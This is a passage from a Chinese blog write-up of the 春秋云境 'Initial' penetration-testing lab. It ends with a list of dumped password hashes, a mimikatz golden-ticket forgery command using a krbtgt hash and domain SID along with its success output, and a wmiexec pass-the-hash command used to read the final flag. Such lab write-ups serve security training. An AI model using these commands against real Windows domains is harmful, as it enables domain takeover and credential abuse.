e1108dfe63de9eeca1eefb995e0929bf</span><br><span class="line">    05  20b58dbb0fc4e2b4e2cb7ab85f3e711f</span><br><span class="line">    06  17b26c73d1998bf5e4389b6c946375b9</span><br><span class="line">    07  e1108dfe63de9eeca1eefb995e0929bf</span><br><span class="line">    08  44fae0b038a11e0aa22bf9c0bb56fde3</span><br><span class="line">    09  44fae0b038a11e0aa22bf9c0bb56fde3</span><br><span class="line">    10  72d34f6f745066292fc20c2bb9afe9aa</span><br><span class="line">    11  64bb1fe398f58cb09752c6cf99ba38d7</span><br><span class="line">    12  44fae0b038a11e0aa22bf9c0bb56fde3</span><br><span class="line">    13  3a6c03097d06f3d661fab05dd266b8db</span><br><span class="line">    14  64bb1fe398f58cb09752c6cf99ba38d7</span><br><span class="line">    15  066092366aa2d4cac0c40b732c663580</span><br><span class="line">    16  066092366aa2d4cac0c40b732c663580</span><br><span class="line">    17  109ffa596356b70d245729765d970b84</span><br><span class="line">    18  b38c61423c6240cc51e237825b24011f</span><br><span class="line">    19  659c24dbf455331d171d56dee8ce401f</span><br><span class="line">    20  70ac8d2c7e5d33c8b05d05bf48dfc66d</span><br><span class="line">    21  04a52bb90362eb38a60a2a7879232aac</span><br><span class="line">    22  04a52bb90362eb38a60a2a7879232aac</span><br><span class="line">    23  0de96f588c278f0520ce23606f88894b</span><br><span class="line">    24  b3785273258b55001fec33d8adb718d8</span><br><span class="line">    25  b3785273258b55001fec33d8adb718d8</span><br><span class="line">    26  65dcf594b8a0be48f803aba2c8c02fd1</span><br><span class="line">    27  803052ac4fb8934f4aba581e8533fdb5</span><br><span class="line">    28  32b62b5536e1ca61eb0ae7e1fb69f0c9</span><br><span class="line">    29  01cb2d0d07700cbf85f27dcf2d15eee0</span><br></pre></td></tr></table></figure>
+
+<p>导入黄金票据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kiwi_cmd kerberos::golden /user:administrator /domain:xiaorang.lab /sid:S-1-5-21-314492864-3856862959-4045974917-502 /krbtgt:fb812eea13a18b7fcdb8e6d67ddc205b /ptt</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">User      : administrator</span><br><span class="line">Domain    : xiaorang.lab (XIAORANG)</span><br><span class="line">SID       : S-1-5-21-314492864-3856862959-4045974917-502</span><br><span class="line">User Id   : 500</span><br><span class="line">Groups Id : *513 512 520 518 519 </span><br><span class="line">ServiceKey: fb812eea13a18b7fcdb8e6d67ddc205b - rc4_hmac_nt      </span><br><span class="line">Lifetime  : 2025/7/10 21:21:04 ; 2035/7/8 21:21:04 ; 2035/7/8 21:21:04</span><br><span class="line">-&gt; Ticket : ** Pass The Ticket **</span><br><span class="line"></span><br><span class="line"> * PAC generated</span><br><span class="line"> * PAC signed</span><br><span class="line"> * EncTicketPart generated</span><br><span class="line"> * EncTicketPart encrypted</span><br><span class="line"> * KrbCred generated</span><br><span class="line"></span><br><span class="line">Golden ticket for &#x27;administrator @ xiaorang.lab&#x27; successfully submitted for current session</span><br></pre></td></tr></table></figure>
+
+<p>之前已经获取了Administrator的hash，接下来可以用wmiexec或者crackmapexec来hash传递了</p>
+<p>wmiexec哈希传递</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 wmiexec.py -hashes :10cf89a850fb1cdbe6bb432b859164c8 xiaorang/administrator@172.22.1.2 &quot;type Users\Administrator\flag\flag03.txt&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/07/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/5.png" alt="alt text"></p>
+<p>完结撒花，耗时1小时22分钟8秒</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://sakuraraindrop.github.io">cheng_xing</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://sakuraraindrop.github.io/2025/07/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/">https://sakuraraindrop.github.io/2025/07/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://sakuraraindrop.github.io" target="_blank">cheng_xing's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/thinkphp/">thinkphp</a><a class="post-meta__tags" href="/tags/sudo%E6%8F%90%E6%9D%83/">sudo提权</a><a class="post-meta__tags" href="/tags/%E4%BF%A1%E5%91%BCOA/">信呼OA</a><a class="post-meta__tags" href="/tags/MS17-010/">MS17-010</a><a class="post-meta__tags" href="/tags/%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92/">票据传递</a></div><div class="post-share"><div class="social-share" data-image="/img/ltx.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related  no-desc" href="/2025/07/09/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B%E5%A4%8D%E7%8E%B0/" title="2024春秋杯冬季赛复现"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">2024春秋杯冬季赛复现</div></div></div></a><a class="pagination-related  no-desc" href="/2025/07/10/Java%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" title="Java基础知识"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">Java基础知识</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/ltx.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">cheng_xing</div><div class="author-info-description">web菜鸡修炼中</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">32</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">97</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/sakuraraindrop"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/sakuraraindrop" target="_blank" title="Github"><i class="fab fa-github" style="color: #hdhfbb;"></i></a><a class="social-icon" href="https://space.bilibili.com/504596197" target="_blank" title="Bilibili"><i class="fab fa-bilibili" style="color: #000000;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#flag1"><span class="toc-number">1.</span> <span class="toc-text">flag1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag2"><span class="toc-number">2.</span> <span class="toc-text">flag2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag3"><span class="toc-number">3.</span> <span class="toc-text">flag3</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/10/Java%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" title="Java基础知识">Java基础知识</a><time datetime="2025-07-10T13:46:08.000Z" title="发表于 2025-07-10 21:46:08">2025-07-10</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/" title="春秋云境-Initial">春秋云境-Initial</a><time datetime="2025-07-10T12:09:27.000Z" title="发表于 2025-07-10 20:09:27">2025-07-10</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/09/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B%E5%A4%8D%E7%8E%B0/" title="2024春秋杯冬季赛复现">2024春秋杯冬季赛复现</a><time datetime="2025-07-09T04:50:46.000Z" title="发表于 2025-07-09 12:50:46">2025-07-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/08/20250708%E9%9A%8F%E7%BC%98%E5%88%B7%E9%A2%98/" title="20250708随缘刷题">20250708随缘刷题</a><time datetime="2025-07-07T16:56:54.000Z" title="发表于 2025-07-08 00:56:54">2025-07-08</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/06/20250706%E9%9A%8F%E7%BC%98%E5%88%B7%E9%A2%98/" title="20250706随缘刷题">20250706随缘刷题</a><time datetime="2025-07-06T15:39:42.000Z" title="发表于 2025-07-06 23:39:42">2025-07-06</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/hk.jpg);"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;2025 By cheng_xing</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.4.0-b1</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
